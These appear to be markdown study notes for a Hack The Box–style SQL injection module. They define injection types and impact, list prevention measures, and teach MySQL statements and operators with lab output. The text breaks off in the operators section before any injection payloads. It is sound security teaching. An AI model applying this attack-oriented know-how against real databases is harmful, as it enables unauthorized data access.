# 🛢️ SQL Injection Fundamentals  
*Unlock the arcane pathways hidden within databases, where ill-guarded gates yield secrets and command the shadows. This module reveals the mysteries of exploiting SQL injection vulnerabilities.*

> *“In the crypts of data, a single malformed whisper can unravel entire vaults.”*

---

### 🔷 Chapter 1: SQL Injection
### 🔶 Chapter 2: Types of SQL Injection
### 🟠 Chapter 3: Use Cases & Impact
### 🟢 Chapter 4: Prevention
### 🔵 Chapter 5: Types of Databases
### 🟣 Chapter 6: SQL (Structured Query Language)
### 🐬 Chapter 7: Using SQL (MySQL)
- Intro to MySQL
- SQL Statements
- Query Results
- SQL Operators
### 🔍 Chapter 8: Detecting SQL Injection
### 🔓 Chapter 9: Subverting Query Logic
- Authentication Bypass
- SQLi Discovery
- OR Injection
- Auth Bypass with OR Operator
- Using Comments
### 🔗 Chapter 10: Union Clause
- Union
- Even Columns
- Un-even Columns
### 💉 Chapter 11: Union Injection
- Finding the Injection / Detecting Columns / Location of Injection
### 📋 Chapter 12: Command Reference

---

<details>
<summary><h2>🔷 SQL Injection</h2></summary>

Databases are used to store and retrieve information. This interaction happens in real time through HTTP requests that travel from the frontend to the backend, which then queries the database to build the response.

When information provided by the user is used to build the query, a malicious user could take advantage of that to give it a different use than the one intended. This is what is known as **SQL Injection (SQLi)**.

Once an attacker discovers that they can inject, the next step is to execute different queries directly in, for example, the login input. This can be achieved by crafting a query that runs the original query **and** a new one, or that completely changes the result. The result can then be obtained and interpreted in the frontend.

There are different types of queries that can achieve this, such as **stacked** or **UNION** queries.

</details>

---

<details>
<summary><h2>🔶 Types of SQL Injection</h2></summary>

SQL injection is classified by **how the results of the injected query are retrieved**. The right technique depends on how much feedback the application returns to the attacker.

| Type | Sub-type | How data is retrieved |
|---|---|---|
| **In-band** | Union-based | The `UNION` operator appends the injected query's results to the original response. |
| **In-band** | Error-based | The database is forced to throw errors that leak data inside the error message. |
| **Blind** | Boolean-based | No data is returned directly; data is inferred from `true`/`false` differences in the response. |
| **Blind** | Time-based | Data is inferred from response delays (e.g. `SLEEP()`) when there is no visible difference. |
| **Out-of-band (OOB)** | — | Data is exfiltrated through a different channel (e.g. DNS/HTTP) when there is no direct or timing feedback. |

**In-band** — In simple cases, the output of both the intended query and the injected one is printed directly on the front end, where we can read it. It has two types:

- **Union-based:** Uses the `UNION` operator to direct the injected query's output to a specific location. We usually have to specify the exact column that can be read, so the result is printed there.
- **Error-based:** Used when PHP or SQL errors are shown on the front end. We intentionally cause an SQL error that returns the output of our query inside the error message.

**Blind** — In more complicated cases, the output is not printed, so we use SQL logic to retrieve it **character by character**. It has two types:

- **Boolean-based:** Uses SQL conditional statements to control whether the page returns any output at all — the page reacts only if the condition evaluates to `true`.
- **Time-based:** Uses SQL conditional statements that **delay** the page response (via the `SLEEP()` function) when the condition evaluates to `true`.

**Out-of-band (OOB)** — In some cases we have no direct access to the output whatsoever, so we direct it to a remote location (e.g. a **DNS record**) and retrieve it from there.

```mermaid
flowchart TD
    A["<b>💉 SQL Injection</b>"] --> B["<b>In-band</b><br/>Same channel"]
    A --> C["<b>Blind</b><br/>Inferred, no data shown"]
    A --> D["<b>Out-of-band</b><br/>Alternate channel"]
    B --> B1["Union-based"]
    B --> B2["Error-based"]
    C --> C1["Boolean-based"]
    C --> C2["Time-based"]
    D --> D1["DNS / HTTP exfil"]

    style A fill:#8b3a3a,stroke:#ff6b6b,stroke-width:3px,color:#fff
    style B fill:#2d3e50,stroke:#6c8ebf,stroke-width:3px,color:#fff
    style C fill:#2d3e50,stroke:#f1c40f,stroke-width:3px,color:#fff
    style D fill:#2d3e50,stroke:#9b87f5,stroke-width:3px,color:#fff
    style B1 fill:#3a5a3a,stroke:#90EE90,stroke-width:2px,color:#fff
    style B2 fill:#3a5a3a,stroke:#90EE90,stroke-width:2px,color:#fff
    style C1 fill:#3a5a3a,stroke:#90EE90,stroke-width:2px,color:#fff
    style C2 fill:#3a5a3a,stroke:#90EE90,stroke-width:2px,color:#fff
    style D1 fill:#3a5a3a,stroke:#90EE90,stroke-width:2px,color:#fff
```

> **NOTE:** This module focuses only on introducing SQL injection through **Union-based** SQL injection.

</details>

---

<details>
<summary><h2>🟠 Use Cases & Impact</h2></summary>

This attack can have a tremendous impact, such as accessing sensitive data like login credentials or card information. This type of information is also often used to access other services when passwords are reused, along with other nefarious purposes.

Other risks include:

- **Bypassing** permissions or logins.
- **Accessing** functions intended for specific roles, such as administrators.
- **Reading or writing** files on the server, which can result in the creation of backdoors on the server itself and gaining control over it.

</details>

---

<details>
<summary><h2>🟢 Prevention</h2></summary>

This can be prevented through good programming practices. Defenses are layered — the first item is the primary control, the rest add depth:

1. **Prepared statements / parameterized queries** — the main defense. They separate SQL **code** from **data**, so user input is never interpreted as part of the query.
2. **Input validation & sanitization** — an extra layer, **not** a substitute. Sanitization alone can be bypassed.
3. **Least privilege** — the database account used by the app should have only the permissions it needs (privilege control).
4. **Web Application Firewall (WAF)** — defense in depth, filtering known malicious patterns.

> **NOTE:** Sanitization by itself is weak. Always rely on prepared statements first; treat validation and a WAF as additional layers, never as the primary fix.

</details>

---

<details>
<summary><h2>🔵 Types of Databases</h2></summary>

Databases, in general, are catalogued as **Relational** and **Non-Relational**. Only relational databases use SQL, while non-relational databases use a variety of methods for communication.

<details>
<summary><h3>Relational Databases</h3></summary>

Relational databases use **keys** to communicate and access information quickly. For example, the `users` table can have an `ID`. That `ID` can be referenced by another table, such as `posts`, through `user_id_posts`. This way, we do not need to store all of the user's details in every post.

The overall structure of a database — its tables, columns, data types, and the relationships between them — is known as the **schema**. The relationships themselves are enforced through **foreign keys** (like `user_id_posts` referencing `users.id`). This type of database is fast and reliable.

```mermaid
flowchart LR
    U["<b>🧑 users</b><br/>id (PK)<br/>username<br/>email"]
    P["<b>📝 posts</b><br/>id (PK)<br/>user_id_posts (FK)<br/>content"]

    U -->|"<b>id referenced by</b>"| P

    style U fill:#3a5a3a,stroke:#90EE90,stroke-width:3px,color:#fff
    style P fill:#2d3e50,stroke:#6c8ebf,stroke-width:3px,color:#fff
```

</details>

<details>
<summary><h3>Non-Relational Databases (NoSQL)</h3></summary>

Non-relational databases (**NoSQL**) do not use tables, rows, columns, or primary keys. This type of database stores information depending on the type of information. Due to the lack of structure and their flexibility, they are highly scalable.

There are four common models:

- **Key-Value**
- **Document based**
- **Wide column**
- **Graph**

One of the most popular is **MongoDB**.

</details>

</details>

---

<details>
<summary><h2>🟣 SQL (Structured Query Language)</h2></summary>

The syntax can vary between management systems (**RDBMS**). However, they all follow the **ISO standard** for SQL.

This language can be used to:

- **Read**, **create**, **update**, and **delete** information.
- **Add** or **remove** users.
- **Grant** or **revoke** permissions.

</details>

---

<details>
<summary><h2>🐬 Using SQL (MySQL)</h2></summary>

The following sections cover the practical use of SQL through MySQL/MariaDB: connecting and creating databases, the core statements, controlling query results, and combining conditions with operators.

<details>
<summary><h3>🐬 Intro to MySQL</h3></summary>

To understand SQL injection through MySQL, we first need the basics of MySQL/SQL syntax. The following examples follow the **MySQL/MariaDB** syntax.

With SQL we can: retrieve, update, and delete data; create new tables and databases; add / remove users; and assign permissions to those users.

<details>
<summary><h4>Command Line</h4></summary>

The `mysql` utility authenticates to and interacts with a MySQL/MariaDB database. The `-u` flag supplies the username and `-p` the password. **Pass `-p` empty** so we are prompted for the password — passing it inline could store it in cleartext in the `.bash_history` file.

<table width="100%">
<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
<tr><td width="20%">

**`Roothulhu@htb[/htb]$`**

</td><td>

```bash
mysql -u root -p
```

</td></tr>
<tr><td colspan="2">

---

```
Enter password: <password>
...SNIP...

mysql>
```

</td></tr>
</table>

It is also possible to pass the password directly, though this should be **avoided** (it may be kept in logs and terminal history):

<table width="100%">
<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
<tr><td width="20%">

**`Roothulhu@htb[/htb]$`**

</td><td>

```bash
mysql -u root -p<password>
```

</td></tr>
</table>

> **TIP:** There must be **no space** between `-p` and the password.

When no host is specified, it defaults to `localhost`. A remote host and port can be set with `-h` and `-P`:

<table width="100%">
<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
<tr><td width="20%">

**`Roothulhu@htb[/htb]$`**

</td><td>

```bash
mysql -u root -h docker.hackthebox.eu -P 3306 -p
```

</td></tr>
</table>

| Flag | Purpose |
|---|---|
| `-u` | Username |
| `-p` | Password (leave empty to be prompted) |
| `-h` | Host (defaults to `localhost`) |
| `-P` | Port (uppercase; default `3306`) |

> **NOTE:** The default MySQL/MariaDB port is `3306`, but it can be reconfigured. Port uses uppercase `-P`, unlike the lowercase `-p` used for passwords.

The examples above log in as the superuser `root`, which has privileges to run all commands. Other DBMS users have limited privileges. Privileges can be viewed with the `SHOW GRANTS` command (covered later).

</details>

<details>
<summary><h4>Creating a Database</h4></summary>

Once logged in, SQL queries interact with the DBMS. A new database is created with the `CREATE DATABASE` statement. **MySQL expects command-line queries to end with a semicolon (`;`).**

<table width="100%">
<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
<tr><td width="20%">

**`mysql>`**

</td><td>

```sql
CREATE DATABASE users;
```

</td></tr>
<tr><td colspan="2">

---

```
Query OK, 1 row affected (0.02 sec)
```

</td></tr>
</table>

The list of databases is shown with `SHOW DATABASES`, and we switch to one with the `USE` statement:

<table width="100%">
<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
<tr><td width="20%">

**`mysql>`**

</td><td>

```sql
SHOW DATABASES;
```

</td></tr>
<tr><td colspan="2">

---

```
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| users              |
+--------------------+
```

</td></tr>
</table>

<table width="100%">
<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
<tr><td width="20%">

**`mysql>`**

</td><td>

```sql
USE users;
```

</td></tr>
<tr><td colspan="2">

---

```
Database changed
```

</td></tr>
</table>

> **NOTE:** SQL statements are **not** case sensitive (`USE users;` == `use users;`), but the **database name is** — `USE USERS;` is not the same as `USE users;`. Writing statements in uppercase is good practice to avoid confusion.

</details>

<details>
<summary><h4>Tables</h4></summary>

A DBMS stores data in **tables**: horizontal **rows** and vertical **columns**, where the intersection of a row and column is a **cell**. Every table has a fixed set of columns, each with a specific **data type** (numbers, strings, date, time, binary data, etc.).

For example, create a `logins` table to store user data with `CREATE TABLE`:

<table width="100%">
<tr><td> 🗄️ <b>SQL</b> </td></tr>
<tr><td>

```sql
CREATE TABLE logins (
    id INT,
    username VARCHAR(100),
    password VARCHAR(100),
    date_of_joining DATETIME
    );
```

</td></tr>
</table>

`CREATE TABLE` specifies the table name, then (within parentheses) each column by name and data type, comma-separated. `id` is an integer; `username` and `password` are strings up to 100 characters (longer input errors out); `date_of_joining` is a `DATETIME`.

A list of tables in the current database is shown with `SHOW TABLES`:

<table width="100%">
<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
<tr><td width="20%">

**`mysql>`**

</td><td>

```sql
SHOW TABLES;
```

</td></tr>
<tr><td colspan="2">

---

```
+-----------------+
| Tables_in_users |
+-----------------+
| logins          |
+-----------------+
1 row in set (0.00 sec)
```

</td></tr>
</table>

The `DESCRIBE` keyword lists the table structure with its fields and data types:

<table width="100%">
<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
<tr><td width="20%">

**`mysql>`**

</td><td>

```sql
DESCRIBE logins;
```

</td></tr>
<tr><td colspan="2">

---

```
+-----------------+--------------+
| Field           | Type         |
+-----------------+--------------+
| id              | int          |
| username        | varchar(100) |
| password        | varchar(100) |
| date_of_joining | date         |
+-----------------+--------------+
4 rows in set (0.00 sec)
```

</td></tr>
</table>

</details>

<details>
<summary><h4>Table Properties</h4></summary>

`CREATE TABLE` supports many properties per table and column:

| Property | Purpose |
|---|---|
| `AUTO_INCREMENT` | Increments the value by one for each new record. |
| `NOT NULL` | Ensures the column is never empty (required field). |
| `UNIQUE` | Ensures inserted values are always unique. |
| `DEFAULT` | Sets a default value (e.g. `NOW()` returns the current date/time). |
| `PRIMARY KEY` | Uniquely identifies each record in the table. |

<table width="100%">
<tr><td> 🗄️ <b>SQL</b> </td></tr>
<tr><td>

```sql
    id INT NOT NULL AUTO_INCREMENT,
    username VARCHAR(100) UNIQUE NOT NULL,
    date_of_joining DATETIME DEFAULT NOW(),
    PRIMARY KEY (id)
```

</td></tr>
</table>

The final `CREATE TABLE` query:

<table width="100%">
<tr><td> 🗄️ <b>SQL</b> </td></tr>
<tr><td>

```sql
CREATE TABLE logins (
    id INT NOT NULL AUTO_INCREMENT,
    username VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(100) NOT NULL,
    date_of_joining DATETIME DEFAULT NOW(),
    PRIMARY KEY (id)
    );
```

</td></tr>
</table>

> **NOTE:** Allow 10–15 seconds for lab servers to start, giving Apache/MySQL enough time to initiate.

</details>

</details>

---

<details>
<summary><h3>✍️ SQL Statements</h3></summary>

With databases and tables in place, these are the essential SQL statements used to manipulate records.

<details>
<summary><h4>INSERT Statement</h4></summary>

`INSERT` adds new records to a table. The full syntax requires a value for **every** column:

<table width="100%">
<tr><td> 🗄️ <b>SQL</b> </td></tr>
<tr><td>

```sql
INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);
```

</td></tr>
</table>

<table width="100%">
<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
<tr><td width="20%">

**`mysql>`**

</td><td>

```sql
INSERT INTO logins VALUES(1, 'admin', 'p@ssw0rd', '2020-07-02');
```

</td></tr>
<tr><td colspan="2">

---

```
Query OK, 1 row affected (0.00 sec)
```

</td></tr>
</table>

Columns with default values (like `id` and `date_of_joining`) can be skipped by naming only the columns to fill:

<table width="100%">
<tr><td> 🗄️ <b>SQL</b> </td></tr>
<tr><td>

```sql
INSERT INTO table_name(column2, column3, ...) VALUES (column2_value, column3_value, ...);
```

</td></tr>
</table>

> **NOTE:** Skipping a column with the `NOT NULL` constraint results in an error — it is a required value.

<table width="100%">
<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
<tr><td width="20%">

**`mysql>`**

</td><td>

```sql
INSERT INTO logins(username, password) VALUES('administrator', 'adm1n_p@ss');
```

</td></tr>
<tr><td colspan="2">

---

```
Query OK, 1 row affected (0.00 sec)
```

</td></tr>
</table>

> **WARNING:** These examples insert **cleartext** passwords for demonstration only. This is bad practice — passwords should always be hashed/encrypted before storage.

Multiple records can be inserted at once, separated by commas:

<table width="100%">
<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
<tr><td width="20%">

**`mysql>`**

</td><td>

```sql
INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');
```

</td></tr>
<tr><td colspan="2">

---

```
Query OK, 2 rows affected (0.00 sec)
Records: 2  Duplicates: 0  Warnings: 0
```

</td></tr>
</table>

</details>

<details>
<summary><h4>SELECT Statement</h4></summary>

`SELECT` retrieves data. The asterisk (`*`) is a wildcard selecting all columns; `FROM` denotes the table:

<table width="100%">
<tr><td> 🗄️ <b>SQL</b> </td></tr>
<tr><td>

```sql
SELECT * FROM table_name;
SELECT column1, column2 FROM table_name;
```

</td></tr>
</table>

<table width="100%">
<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
<tr><td width="20%">

**`mysql>`**

</td><td>

```sql
SELECT * FROM logins;
```

</td></tr>
<tr><td colspan="2">

---

```
+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  3 | john          | john123!   | 2020-07-02 11:47:16 |
|  4 | tom           | tom123!    | 2020-07-02 11:47:16 |
+----+---------------+------------+---------------------+
4 rows in set (0.00 sec)
```

</td></tr>
</table>

Selecting only specific columns:

<table width="100%">
<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
<tr><td width="20%">

**`mysql>`**

</td><td>

```sql
SELECT username,password FROM logins;
```

</td></tr>
<tr><td colspan="2">

---

```
+---------------+------------+
| username      | password   |
+---------------+------------+
| admin         | p@ssw0rd   |
| administrator | adm1n_p@ss |
| john          | john123!   |
| tom           | tom123!    |
+---------------+------------+
4 rows in set (0.00 sec)
```

</td></tr>
</table>

</details>

<details>
<summary><h4>DROP Statement</h4></summary>

`DROP` removes tables and databases from the server:

<table width="100%">
<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
<tr><td width="20%">

**`mysql>`**

</td><td>

```sql
DROP TABLE logins;
```

</td></tr>
<tr><td colspan="2">

---

```
Query OK, 0 rows affected (0.01 sec)
```

</td></tr>
</table>

<table width="100%">
<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
<tr><td width="20%">

**`mysql>`**

</td><td>

```sql
SHOW TABLES;
```

</td></tr>
<tr><td colspan="2">

---

```
Empty set (0.00 sec)
```

</td></tr>
</table>

> **WARNING:** `DROP` permanently and completely deletes the table with **no confirmation**. Use with caution.

</details>

<details>
<summary><h4>ALTER Statement</h4></summary>

`ALTER` changes a table's name, its fields, or adds/removes columns (requires sufficient privileges).

**Add** a new column with `ADD`:

<table width="100%">
<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
<tr><td width="20%">

**`mysql>`**

</td><td>

```sql
ALTER TABLE logins ADD newColumn INT;
```

</td></tr>
<tr><td colspan="2">

---

```
Query OK, 0 rows affected (0.01 sec)
```

</td></tr>
</table>

**Rename** a column with `RENAME COLUMN`:

<table width="100%">
<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
<tr><td width="20%">

**`mysql>`**

</td><td>

```sql
ALTER TABLE logins RENAME COLUMN newColumn TO newerColumn;
```

</td></tr>
<tr><td colspan="2">

---

```
Query OK, 0 rows affected (0.01 sec)
```

</td></tr>
</table>

**Change** a column's datatype with `MODIFY`:

<table width="100%">
<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
<tr><td width="20%">

**`mysql>`**

</td><td>

```sql
ALTER TABLE logins MODIFY newerColumn DATE;
```

</td></tr>
<tr><td colspan="2">

---

```
Query OK, 0 rows affected (0.01 sec)
```

</td></tr>
</table>

**Drop** a column with `DROP`:

<table width="100%">
<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
<tr><td width="20%">

**`mysql>`**

</td><td>

```sql
ALTER TABLE logins DROP newerColumn;
```

</td></tr>
<tr><td colspan="2">

---

```
Query OK, 0 rows affected (0.01 sec)
```

</td></tr>
</table>

</details>

<details>
<summary><h4>UPDATE Statement</h4></summary>

While `ALTER` changes a table's structure, `UPDATE` changes specific **records** based on a condition:

<table width="100%">
<tr><td> 🗄️ <b>SQL</b> </td></tr>
<tr><td>

```sql
UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;
```

</td></tr>
</table>

<table width="100%">
<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
<tr><td width="20%">

**`mysql>`**

</td><td>

```sql
UPDATE logins SET password = 'change_password' WHERE id > 1;
```

</td></tr>
<tr><td colspan="2">

---

```
Query OK, 3 rows affected (0.00 sec)
Rows matched: 3  Changed: 3  Warnings: 0
```

</td></tr>
</table>

<table width="100%">
<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
<tr><td width="20%">

**`mysql>`**

</td><td>

```sql
SELECT * FROM logins;
```

</td></tr>
<tr><td colspan="2">

---

```
+----+---------------+-----------------+---------------------+
| id | username      | password        | date_of_joining     |
+----+---------------+-----------------+---------------------+
|  1 | admin         | p@ssw0rd        | 2020-07-02 00:00:00 |
|  2 | administrator | change_password | 2020-07-02 11:30:50 |
|  3 | john          | change_password | 2020-07-02 11:47:16 |
|  4 | tom           | change_password | 2020-07-02 11:47:16 |
+----+---------------+-----------------+---------------------+
4 rows in set (0.00 sec)
```

</td></tr>
</table>

> **NOTE:** A `WHERE` clause **must** be specified with `UPDATE` to define which records get updated. The `WHERE` clause is covered next.

</details>

</details>

---

<details>
<summary><h3>🔎 Query Results</h3></summary>

These clauses control the output of a query — how it is sorted, how much is returned, and which records match.

<details>
<summary><h4>Sorting Results — ORDER BY</h4></summary>

`ORDER BY` sorts results by a chosen column (ascending by default):

<table width="100%">
<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
<tr><td width="20%">

**`mysql>`**

</td><td>

```sql
SELECT * FROM logins ORDER BY password;
```

</td></tr>
<tr><td colspan="2">

---

```
+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  3 | john          | john123!   | 2020-07-02 11:47:16 |
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  4 | tom           | tom123!    | 2020-07-02 11:47:16 |
+----+---------------+------------+---------------------+
4 rows in set (0.00 sec)
```

</td></tr>
</table>

Sort direction can be set with `ASC` or `DESC`:

<table width="100%">
<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
<tr><td width="20%">

**`mysql>`**

</td><td>

```sql
SELECT * FROM logins ORDER BY password DESC;
```

</td></tr>
<tr><td colspan="2">

---

```
+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  4 | tom           | tom123!    | 2020-07-02 11:47:16 |
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  3 | john          | john123!   | 2020-07-02 11:47:16 |
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
+----+---------------+------------+---------------------+
4 rows in set (0.00 sec)
```

</td></tr>
</table>

Multiple columns can be given for a secondary sort on duplicate values:

<table width="100%">
<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
<tr><td width="20%">

**`mysql>`**

</td><td>

```sql
SELECT * FROM logins ORDER BY password DESC, id ASC;
```

</td></tr>
<tr><td colspan="2">

---

```
+----+---------------+-----------------+---------------------+
| id | username      | password        | date_of_joining     |
+----+---------------+-----------------+---------------------+
|  1 | admin         | p@ssw0rd        | 2020-07-02 00:00:00 |
|  2 | administrator | change_password | 2020-07-02 11:30:50 |
|  3 | john          | change_password | 2020-07-02 11:47:16 |
|  4 | tom           | change_password | 2020-07-02 11:50:20 |
+----+---------------+-----------------+---------------------+
4 rows in set (0.00 sec)
```

</td></tr>
</table>

</details>

<details>
<summary><h4>LIMIT Results</h4></summary>

`LIMIT` restricts the number of records returned:

<table width="100%">
<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
<tr><td width="20%">

**`mysql>`**

</td><td>

```sql
SELECT * FROM logins LIMIT 2;
```

</td></tr>
<tr><td colspan="2">

---

```
+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
+----+---------------+------------+---------------------+
2 rows in set (0.00 sec)
```

</td></tr>
</table>

An offset can be given before the count (`LIMIT offset, count`):

<table width="100%">
<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
<tr><td width="20%">

**`mysql>`**

</td><td>

```sql
SELECT * FROM logins LIMIT 1, 2;
```

</td></tr>
<tr><td colspan="2">

---

```
+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  3 | john          | john123!   | 2020-07-02 11:47:16 |
+----+---------------+------------+---------------------+
2 rows in set (0.00 sec)
```

</td></tr>
</table>

> **NOTE:** The offset marks the order of the first record to include, starting from `0`. Above, it starts at (and includes) the 2nd record and returns two values.

</details>

<details>
<summary><h4>WHERE Clause</h4></summary>

The `WHERE` clause filters records to those matching a condition:

<table width="100%">
<tr><td> 🗄️ <b>SQL</b> </td></tr>
<tr><td>

```sql
SELECT * FROM table_name WHERE <condition>;
```

</td></tr>
</table>

<table width="100%">
<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
<tr><td width="20%">

**`mysql>`**

</td><td>

```sql
SELECT * FROM logins WHERE id > 1;
```

</td></tr>
<tr><td colspan="2">

---

```
+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  3 | john          | john123!   | 2020-07-02 11:47:16 |
|  4 | tom           | tom123!    | 2020-07-02 11:47:16 |
+----+---------------+------------+---------------------+
3 rows in set (0.00 sec)
```

</td></tr>
</table>

Filtering by a string value:

<table width="100%">
<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
<tr><td width="20%">

**`mysql>`**

</td><td>

```sql
SELECT * FROM logins WHERE username = 'admin';
```

</td></tr>
<tr><td colspan="2">

---

```
+----+----------+----------+---------------------+
| id | username | password | date_of_joining     |
+----+----------+----------+---------------------+
|  1 | admin    | p@ssw0rd | 2020-07-02 00:00:00 |
+----+----------+----------+---------------------+
1 row in set (0.00 sec)
```

</td></tr>
</table>

> **NOTE:** String and date values must be wrapped in single (`'`) or double (`"`) quotes, while numbers can be used directly.

</details>

<details>
<summary><h4>LIKE Clause</h4></summary>

`LIKE` selects records matching a pattern. `%` matches zero or more characters; `_` matches exactly one character.

The query below retrieves all usernames starting with `admin`:

<table width="100%">
<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
<tr><td width="20%">

**`mysql>`**

</td><td>

```sql
SELECT * FROM logins WHERE username LIKE 'admin%';
```

</td></tr>
<tr><td colspan="2">

---

```
+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  4 | administrator | adm1n_p@ss | 2020-07-02 15:19:02 |
+----+---------------+------------+---------------------+
2 rows in set (0.00 sec)
```

</td></tr>
</table>

Matching usernames with exactly three characters using `_`:

<table width="100%">
<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
<tr><td width="20%">

**`mysql>`**

</td><td>

```sql
SELECT * FROM logins WHERE username LIKE '___';
```

</td></tr>
<tr><td colspan="2">

---

```
+----+----------+----------+---------------------+
| id | username | password | date_of_joining     |
+----+----------+----------+---------------------+
|  3 | tom      | tom123!  | 2020-07-02 15:18:56 |
+----+----------+----------+---------------------+
1 row in set (0.01 sec)
```

</td></tr>
</table>

| Wildcard | Matches |
|---|---|
| `%` | Zero or more characters |
| `_` | Exactly one character |

</details>

</details>

---

<details>
<summary><h3>🧮 SQL Operators</h3></summary>

When a single condition is not enough, SQL supports **logical operators** to combine multiple conditions. The most common are `AND`, `OR`, and `NOT`.

> **NOTE:** In MySQL, any **non-zero** value is `true` (usually returned as `1`), and `0` is `false`.

<details>
<summary><h4>AND Operator</h4></summary>

`AND` takes two conditions and returns true **only if both** evaluate to true:

<table width="100%">
<tr><td> 🗄️ <b>SQL</b> </td></tr>
<tr><td>

```sql
condition1 AND condition2
```

</td></tr>
</table>

<table width="100%">
<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
<tr><td width="20%">

**`mysql>`**

</td><td>

```sql
SELECT 1 = 1 AND 'test' = 'test';
SELECT 1 = 1 AND 'test' = 'abc';
```

</td></tr>
<tr><td colspan="2">

---

```
+---------------------------+
| 1 = 1 AND 'test' = 'test' |
+---------------------------+
|                         1 |
+---------------------------+

+--------------------------+
| 1 = 1 AND 'test' = 'abc' |
+--------------------------+
|                        0 |
+--------------------------+
```

</td></tr>
</table>

The first query is true (both conditions true); the second is false (`'test' = 'abc'` is false).

</details>

<details>
<summary><h4>OR Operator</h4></summary>

`OR` returns true when **at least one** condition evaluates to true:

<table width="100%">
<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
<tr><td width="20%">

**`mysql>`**

</td><td>

```sql
SELECT 1 = 1 OR 'test' = 'abc';
SELECT 1 = 2 OR 'test' = 'abc';
```

</td></tr>
<tr><td colspan="2">

---

```
+-------------------------+
| 1 = 1 OR 'test' = 'abc' |
+-------------------------+
|                       1 |
+-------------------------+

+-------------------------+
| 1 = 2 OR 'test' = 'abc' |
+-------------------------+
|                       0 |
+-------------------------+
```

</td></tr>
</table>

The first query is true (`1 = 1` is true); the second is false (both conditions false).

</details>

<details>
<summary><h4>NOT Operator</h4></summary>

`NOT` toggles a boolean value — true becomes false and vice versa:

<table width="100%">
<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
<tr><td width="20%">

**`mysql>`**

</td><td>

```sql
SELECT NOT 1 = 1;
SELECT NOT 1 = 2;
```

</td></tr>
<tr><td colspan="2">

---

```
+-----------+
| NOT 1 = 1 |
+-----------+
|         0 |
+-----------+

+-----------+
| NOT 1 = 2 |
+-----------+
|         1 |
+-----------+
```

</td></tr>
</table>

The first is false (inverse of true); the second is true (inverse of false).

</details>

<details>
<summary><h4>Symbol Operators</h4></summary>

`AND`, `OR`, and `NOT` can also be written as `&&`, `||`, and `!`:

| Keyword | Symbol |
|---|---|
| `AND` | `&&` |
| `OR` | `\|\|` |
| `NOT` | `!` |

<table width="100%">
<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
<tr><td width="20%">

**`mysql>`**

</td><td>

```sql
SELECT 1 = 1 && 'test' = 'abc';
SELECT 1 = 1 || 'test' = 'abc';
SELECT 1 != 1;
```

</td></tr>
<tr><td colspan="2">

---

```
+-------------------------+
| 1 = 1 && 'test' = 'abc' |
+-------------------------+
|                       0 |
+-------------------------+
1 row in set, 1 warning (0.00 sec)

+-------------------------+
| 1 = 1 || 'test' = 'abc' |
+-------------------------+
|                       1 |
+-------------------------+
1 row in set, 1 warning (0.00 sec)

